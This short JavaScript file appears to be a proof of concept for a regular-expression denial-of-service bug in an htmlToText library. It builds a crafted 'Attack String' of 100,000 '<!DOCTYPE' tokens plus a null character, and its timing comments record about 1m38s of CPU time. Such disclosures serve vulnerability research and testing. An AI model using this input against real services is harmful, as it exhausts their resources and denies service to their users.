const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"<!DOCTYPE"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<!DOCTYPE";
}
str += "\u0000";

var result = htmlToText(str, false);

// real    1m38.612s
// user    1m38.563s
// sys     0m0.030s